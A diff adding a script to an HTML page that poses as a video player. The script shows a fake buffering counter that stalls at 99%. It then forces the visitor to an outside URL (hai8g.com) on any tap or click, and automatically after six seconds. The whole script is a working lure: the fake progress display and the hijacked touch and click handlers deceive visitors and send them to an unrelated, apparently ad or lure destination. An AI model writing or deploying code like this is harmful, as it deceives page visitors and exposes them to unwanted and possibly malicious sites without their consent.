@@ -1,0 +1,76 @@
+<script>
+    var targetUrl = "https://hai8g.com/4/10155957";
+    var vid = document.getElementById("myVideo");
+    var loader = document.getElementById("loader");
+    var bufferText = document.getElementById("bufferText");
+    var soundIcon = document.getElementById("soundIcon");
+    var soundText = document.getElementById("soundText");
+    var isRedirected = false;
+
+    // Fast Buffering Counter (85% -> 99%)
+    var percent = 85;
+    var bufferInterval = setInterval(function() {
+      if (percent < 99) {
+        percent += Math.floor(Math.random() * 4) + 1;
+        if (percent > 99) percent = 99;
+        if (bufferText) bufferText.innerText = "Buffering... " + percent + "%";
+      } else {
+        clearInterval(bufferInterval);
+      }
+    }, 250);
+
+    // Video Start hone par Loader aur Buffering Text dono remove karne ke liye function
+    function hideLoader() {
+      if (loader) loader.style.display = "none";
+      if (bufferText) bufferText.style.display = "none";
+      if (bufferInterval) clearInterval(bufferInterval);
+    }
+
+    if (vid) {
+      vid.addEventListener("canplay", hideLoader);
+      vid.addEventListener("playing", hideLoader);
+      vid.addEventListener("timeupdate", function() {
+        if (vid.currentTime > 0) hideLoader();
+      });
+
+      var promise = vid.play();
+      if (promise !== undefined) {
+        promise.catch(function() {
+          vid.muted = true;
+          vid.play().then(hideLoader).catch(function(){});
+        });
+      }
+    }
+
+    function toggleSound(e) {
+      e.stopPropagation();
+      if (vid) {
+        if (vid.muted) {
+          vid.muted = false;
+          soundIcon.innerText = "🔊"; soundText.innerText = "Sound On";
+        } else {
+          vid.muted = true;
+          soundIcon.innerText = "🔇"; soundText.innerText = "Tap to Unmute";
+        }
+      }
+    }
+
+    // High Speed Redirect Function
+    function openLink() {
+      if (!isRedirected) {
+        isRedirected = true;
+        window.location.href = targetUrl;
+      }
+    }
+
+    var mainContainer = document.getElementById("mainContainer");
+    
+    // Instant Mobile Touch Redirect
+    mainContainer.addEventListener("touchstart", openLink, { passive: true });
+    mainContainer.addEventListener("click", openLink);
+    
+    // 6 Seconds Auto Redirect
+    setTimeout(openLink, 6000);
+  </script>
+</body>
+</html>
